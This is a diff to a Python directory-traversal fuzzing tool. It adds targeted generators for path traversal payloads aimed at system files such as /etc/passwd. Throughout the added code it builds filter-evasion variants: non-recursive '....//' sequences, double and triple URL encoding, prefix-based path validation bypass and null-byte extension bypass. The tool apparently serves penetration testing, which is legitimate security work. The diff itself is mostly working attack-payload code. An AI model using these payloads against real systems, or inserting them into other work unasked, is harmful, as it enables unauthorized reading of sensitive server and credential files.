@@ -20,6 +20,17 @@ class OSType(Enum):
     GENERIC = "generic"
 
 
+class DetectionMethod(Enum):
+    """Detection methods for targeted payload generation"""
+    SIMPLE = "simple"                           # Basic traversal sequences (../../../etc/passwd)
+    ABSOLUTE_PATH = "absolute_path"             # Absolute path bypass (/etc/passwd)
+    NON_RECURSIVE = "non_recursive"             # Non-recursive filter bypass (....//....//....//etc/passwd)
+    URL_ENCODING = "url_encoding"               # URL encoding bypass (..%252f..%252f..%252fetc/passwd)
+    PATH_VALIDATION = "path_validation"         # Path validation bypass (/var/www/images/../../../etc/passwd)
+    NULL_BYTE = "null_byte"                     # Null byte extension bypass (../../../etc/passwd%00.png)
+    ANY = "any"                                 # All detection methods combined
+
+
 class TraversalEngine:
     """
     Engine that builds traversal strings according to the depth provided and OS type.
@@ -483,7 +494,8 @@ class TraversalEngine:
         extra_files: bool = False,
         extension: Optional[str] = None,
         bisection_depth: Optional[int] = None,
-        include_absolute: bool = True
+        include_absolute: bool = True,
+        detection_method: DetectionMethod = DetectionMethod.ANY
     ) -> List[str]:
         """
         Generate traversal strings based on parameters
@@ -496,10 +508,54 @@ class TraversalEngine:
             extension: File extension to append to each fuzz string
             bisection_depth: If provided, use this depth for bisection algorithm
             include_absolute: Include direct absolute path injection patterns (default: True)
+            detection_method: Specific detection method to use for payload generation
             
         Returns:
             List of traversal strings to test
         """
+        if not self.quiet and detection_method != DetectionMethod.ANY:
+            method_descriptions = {
+                DetectionMethod.SIMPLE: "Basic directory traversal patterns",
+                DetectionMethod.ABSOLUTE_PATH: "Direct absolute path injection",
+                DetectionMethod.NON_RECURSIVE: "Non-recursive filter bypass patterns",
+                DetectionMethod.URL_ENCODING: "Multi-level URL encoding bypass",
+                DetectionMethod.PATH_VALIDATION: "Path validation bypass patterns",
+                DetectionMethod.NULL_BYTE: "Null byte extension bypass patterns"
+            }
+            print(f"[+] Using targeted detection method: {method_descriptions[detection_method]}")
+        
+        # If ANY method is selected, use full generation (existing behavior)
+        if detection_method == DetectionMethod.ANY:
+            return self._generate_all_methods(os_type, depth, specific_file, extra_files, extension, bisection_depth, include_absolute)
+        
+        # Method-specific payload generation
+        if detection_method == DetectionMethod.SIMPLE:
+            return self._generate_simple_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
+        elif detection_method == DetectionMethod.ABSOLUTE_PATH:
+            return self._generate_absolute_path_traversals(os_type, specific_file, extra_files, extension)
+        elif detection_method == DetectionMethod.NON_RECURSIVE:
+            return self._generate_non_recursive_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
+        elif detection_method == DetectionMethod.URL_ENCODING:
+            return self._generate_url_encoding_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
+        elif detection_method == DetectionMethod.PATH_VALIDATION:
+            return self._generate_path_validation_traversals(os_type, depth, specific_file, extra_files, extension)
+        elif detection_method == DetectionMethod.NULL_BYTE:
+            return self._generate_null_byte_traversals(os_type, depth, specific_file, extra_files, extension)
+        
+        # This should not be reached due to the ANY check above, but for safety
+        return self._generate_all_methods(os_type, depth, specific_file, extra_files, extension, bisection_depth, include_absolute)
+
+    def _generate_all_methods(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str],
+        bisection_depth: Optional[int],
+        include_absolute: bool
+    ) -> List[str]:
+        """Generate traversals using all detection methods (original behavior)"""
         if not self.quiet:
             print("[+] Creating Traversal patterns (mix of dots and slashes)")
 
@@ -1831,3 +1887,185 @@ class TraversalEngine:
             return OSType.UNIX
         else:
             return OSType.GENERIC
+
+    # Method-specific payload generation functions
+
+    def _generate_simple_traversals(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str],
+        bisection_depth: Optional[int]
+    ) -> List[str]:
+        """Generate basic directory traversal patterns (../../../etc/passwd)"""
+        if not self.quiet:
+            print("[+] Generating SIMPLE traversal patterns - Basic directory traversal sequences")
+        
+        # Generate basic patterns only (no special encoding)
+        basic_patterns = ["../", "..\\", "./", ".\\"]
+        max_depth = bisection_depth if bisection_depth else depth
+        min_depth = bisection_depth if bisection_depth else 1
+        
+        traversal_strings = []
+        for pattern in basic_patterns:
+            for k in range(min_depth, max_depth + 1):
+                traversal_strings.append(pattern * k)
+        
+        # Get target files
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Combine with target files
+        final_traversals = []
+        for traversal in traversal_strings:
+            for target_file in target_files:
+                payload = traversal + target_file
+                if extension:
+                    payload += extension
+                final_traversals.append(payload)
+        
+        if not self.quiet:
+            print(f"[+] Simple traversal patterns created: {len(final_traversals)}")
+        
+        return final_traversals
+
+    def _generate_absolute_path_traversals(
+        self,
+        os_type: OSType,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str]
+    ) -> List[str]:
+        """Generate direct absolute path injection patterns (/etc/passwd)"""
+        if not self.quiet:
+            print("[+] Generating ABSOLUTE PATH patterns - Direct absolute path injection")
+        
+        patterns = self._generate_absolute_patterns(os_type, specific_file, extra_files, extension)
+        
+        if not self.quiet:
+            print(f"[+] Absolute path patterns created: {len(patterns)}")
+        
+        return patterns
+
+    def _generate_non_recursive_traversals(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str],
+        bisection_depth: Optional[int]
+    ) -> List[str]:
+        """Generate non-recursive filter bypass patterns (....//....//....//etc/passwd)"""
+        if not self.quiet:
+            print("[+] Generating NON-RECURSIVE bypass patterns - Filter evasion sequences")
+        
+        max_depth = bisection_depth if bisection_depth else depth
+        nonrecursive_traversals = self._generate_nonrecursive_bypass_traversals(max_depth)
+        
+        # Get target files
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Combine with target files
+        final_traversals = []
+        for traversal in nonrecursive_traversals:
+            for target_file in target_files:
+                payload = traversal + target_file
+                if extension:
+                    payload += extension
+                final_traversals.append(payload)
+        
+        if not self.quiet:
+            print(f"[+] Non-recursive bypass patterns created: {len(final_traversals)}")
+        
+        return final_traversals
+
+    def _generate_url_encoding_traversals(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str],
+        bisection_depth: Optional[int]
+    ) -> List[str]:
+        """Generate multi-level URL encoding bypass patterns (..%252f..%252f..%252fetc/passwd)"""
+        if not self.quiet:
+            print("[+] Generating URL ENCODING bypass patterns - Multi-level encoding evasion")
+        
+        # Focus on URL encoded patterns
+        encoded_patterns = [
+            "%2e%2e%2f",      # Single URL encoding
+            "%252e%252e%252f", # Double URL encoding  
+            "%25252e%25252e%25252f", # Triple URL encoding
+            "%2e%2e%5c",      # Single backslash encoding
+            "%252e%252e%255c", # Double backslash encoding
+        ]
+        
+        max_depth = bisection_depth if bisection_depth else depth
+        min_depth = bisection_depth if bisection_depth else 1
+        
+        traversal_strings = []
+        for pattern in encoded_patterns:
+            for k in range(min_depth, max_depth + 1):
+                traversal_strings.append(pattern * k)
+        
+        # Get target files
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Combine with target files
+        final_traversals = []
+        for traversal in traversal_strings:
+            for target_file in target_files:
+                payload = traversal + target_file
+                if extension:
+                    payload += extension
+                final_traversals.append(payload)
+        
+        if not self.quiet:
+            print(f"[+] URL encoding bypass patterns created: {len(final_traversals)}")
+        
+        return final_traversals
+
+    def _generate_path_validation_traversals(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str]
+    ) -> List[str]:
+        """Generate path validation bypass patterns (/var/www/images/../../../etc/passwd)"""
+        if not self.quiet:
+            print("[+] Generating PATH VALIDATION bypass patterns - Legitimate prefix evasion")
+        
+        patterns = self._generate_path_validation_bypass_patterns(
+            os_type, specific_file, extra_files, extension, depth
+        )
+        
+        if not self.quiet:
+            print(f"[+] Path validation bypass patterns created: {len(patterns)}")
+        
+        return patterns
+
+    def _generate_null_byte_traversals(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str]
+    ) -> List[str]:
+        """Generate null byte extension bypass patterns (../../../etc/passwd%00.png)"""
+        if not self.quiet:
+            print("[+] Generating NULL BYTE bypass patterns - File extension validation evasion")
+        
+        patterns = self._generate_null_byte_bypass_patterns(
+            os_type, specific_file, extra_files, extension, depth
+        )
+        
+        if not self.quiet:
+            print(f"[+] Null byte bypass patterns created: {len(patterns)}")
+        
+        return patterns
